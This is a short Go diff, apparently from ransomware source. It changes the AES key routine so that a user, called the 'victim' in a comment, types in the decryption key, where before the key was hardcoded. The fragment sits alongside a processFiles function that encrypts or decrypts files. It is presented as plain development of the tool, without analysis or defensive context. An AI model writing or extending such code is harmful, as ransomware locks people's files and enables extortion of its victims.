@@ -76,13 +76,16 @@ func processFiles(action string, gcm cipher.AEAD) {
 	})
 }
 
-// Function to get the AES key (hardcoded)
+// Function to get the AES key (entered by user)
 func getKey() (cipher.AEAD, error) {
-	// Hardcoded key (change this to your desired key)
-	key := []byte("thisisthesecretkeythatwillbeused")
+	// Ask the user (victim) to input the key for decryption
+	fmt.Print("Enter decryption key: ")
+	var key string
+	fmt.Scanln(&key)
 
-	// Use the hardcoded key for AES encryption
-	block, err := aes.NewCipher(key)
+	// Use the entered key for AES encryption
+	keyBytes := []byte(key)
+	block, err := aes.NewCipher(keyBytes)
 	if err != nil {
 		return nil, err
 	}
